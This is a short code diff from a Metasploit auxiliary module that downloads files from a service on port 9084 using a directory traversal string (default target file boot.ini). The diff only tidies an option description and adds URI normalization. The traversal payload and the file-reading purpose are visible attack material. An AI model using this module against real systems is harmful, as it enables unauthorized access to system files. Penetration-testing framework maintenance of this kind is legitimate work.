@@ -39,7 +39,7 @@ class Metasploit3 < Msf::Auxiliary
 		register_options(
 			[
 				Opt::RPORT(9084),
-				OptString.new('URIPATH', [true, 'URI path to the downloads/', '/vci/downloads/']),
+				OptString.new('URIPATH', [true, 'URI path to the downloads', '/vci/downloads/']),
 				OptString.new('FILE', [true, 'Define the remote file to download', 'boot.ini'])
 			], self.class)
 	end
@@ -47,7 +47,7 @@ class Metasploit3 < Msf::Auxiliary
 	def run_host(ip)
 		fname     = File.basename(datastore['FILE'])
 		traversal = ".\\..\\..\\..\\..\\..\\..\\..\\"
-		uri = datastore['URIPATH'] + traversal + datastore['FILE']
+		uri = normalize_uri(datastore['URIPATH']) + traversal + datastore['FILE']
 
 		print_status("#{rhost}:#{rport} - Requesting: #{uri}")
 
